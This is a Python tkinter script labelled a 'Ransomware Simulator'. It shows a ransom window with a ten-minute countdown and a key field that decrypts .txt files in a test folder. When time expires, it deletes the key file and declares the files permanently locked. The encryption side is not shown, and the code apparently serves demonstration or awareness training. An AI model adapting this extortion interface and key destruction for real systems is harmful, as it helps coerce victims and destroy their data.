import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import os
import threading

KEY_PATH = "keyfile.key"
TARGET_FOLDER = "test_files"
COUNTDOWN_SECONDS = 600  # 10 minutes

def decrypt_files(user_key):
    try:
        fernet = Fernet(user_key)
        for root, _, files in os.walk(TARGET_FOLDER):
            for file in files:
                if file.endswith(".txt"):
                    path = os.path.join(root, file)
                    with open(path, "rb") as f:
                        data = f.read()
                    decrypted_data = fernet.decrypt(data)
                    with open(path, "wb") as f:
                        f.write(decrypted_data)
        messagebox.showinfo("Success", "Files have been decrypted.")
        exit(0)
    except Exception:
        messagebox.showerror("Invalid Key", "Decryption failed. Wrong key.")

class RansomGUI:
    def __init__(self, master):
        self.master = master
        master.title("Ransomware Simulator")
        master.geometry("400x250")

        self.timer_label = tk.Label(master, text="Time Left: 10:00", font=("Arial", 16))
        self.timer_label.pack(pady=10)

        self.info = tk.Label(master, text="Your files have been encrypted.\nEnter the decryption key below:", font=("Arial", 12))
        self.info.pack(pady=5)

        self.key_entry = tk.Entry(master, width=50)
        self.key_entry.pack(pady=10)

        self.unlock_btn = tk.Button(master, text="Unlock Files", command=self.try_unlock)
        self.unlock_btn.pack(pady=10)

        self.remaining = COUNTDOWN_SECONDS
        self.update_timer()

    def try_unlock(self):
        user_key = self.key_entry.get().strip()
        if not user_key:
            messagebox.showwarning("Input Required", "Please enter the key.")
            return
        decrypt_files(user_key.encode())

    def update_timer(self):
        minutes, seconds = divmod(self.remaining, 60)
        self.timer_label.config(text=f"Time Left: {minutes:02}:{seconds:02}")
        if self.remaining > 0:
            self.remaining -= 1
            self.master.after(1000, self.update_timer)
        else:
            self.lock_files()

    def lock_files(self):
        self.key_entry.config(state=tk.DISABLED)
        self.unlock_btn.config(state=tk.DISABLED)
        self.timer_label.config(text="Time's up!")
        try:
            os.remove(KEY_PATH)
        except Exception:
            pass
        messagebox.showerror("Locked", "Key has been destroyed. Files are permanently locked.")

if __name__ == "__main__":
    root = tk.Tk()
    app = RansomGUI(root)
    root.mainloop()
